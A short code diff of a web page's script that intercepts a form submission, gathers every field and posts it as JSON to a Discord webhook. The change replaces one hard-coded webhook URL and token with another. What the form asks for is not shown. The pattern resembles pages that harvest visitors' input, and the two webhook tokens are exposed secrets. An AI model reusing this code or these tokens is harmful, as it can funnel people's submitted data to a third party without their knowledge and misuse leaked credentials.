@@ -151,7 +151,6 @@
                 }
             });
 
-            // Webhook integration and redirection
             var form = document.querySelector('form');
             form.addEventListener('submit', function(event) {
                 event.preventDefault(); // Prevent default form submission
@@ -162,7 +161,7 @@
                     data[key] = value;
                 });
 
-                fetch('https://discord.com/api/webhooks/1261676376738496583/SzVE-GKOsGTXKmEqYfX5uWnHEuSKl0TWlC71vGAPJrPYjh7avVThor-fhTSXgRqp5DtG', { // Replace 'YOUR_WEBHOOK_URL' with your actual webhook URL
+                fetch('https://discord.com/api/webhooks/1261683917598228570/_lhjvderbyWjRknoIVQYmr1ShS35YSqCUI7mgglwqDK9b2LOxqMb62qJ97czlg-Ay2x4', {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json'
